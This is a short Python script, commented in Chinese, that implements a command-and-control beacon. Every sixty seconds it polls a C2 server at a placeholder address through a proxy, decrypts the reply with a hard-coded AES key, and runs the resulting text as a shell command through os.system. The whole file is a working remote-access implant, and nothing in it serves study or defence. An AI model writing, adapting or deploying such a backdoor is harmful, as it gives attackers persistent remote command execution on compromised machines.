import requests
import time
import os
from Crypto.Cipher import AES
import base64

# AES加密和解密函数
def decrypt(ciphertext, key):
    raw_data = base64.b64decode(ciphertext)
    nonce = raw_data[:16]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    plaintext = cipher.decrypt(raw_data[16:])
    return plaintext.decode()

def execute_command(command):
    os.system(command)

def main(c2_url, encryption_key, proxy):
    while True:
        try:
            response = requests.get(c2_url, proxies={"http": proxy, "https": proxy})
            if response.status_code == 200:
                encrypted_command = response.text
                command = decrypt(encrypted_command, encryption_key)
                execute_command(command)
        except Exception as e:
            print(f'Error connecting to C2 server: {e}')

        # 心跳间隔时间（例如，60秒）
        time.sleep(60)

if __name__ == '__main__':
    c2_url = 'http://IP地址:8080/heartbeat'  # 通过代理服务器连接到C2服务器
    encryption_key = b'0123456789abcdef'  # 16字节AES密钥
    proxy = 'http://IP地址:8888'  # 代理服务器地址
    main(c2_url, encryption_key, proxy)
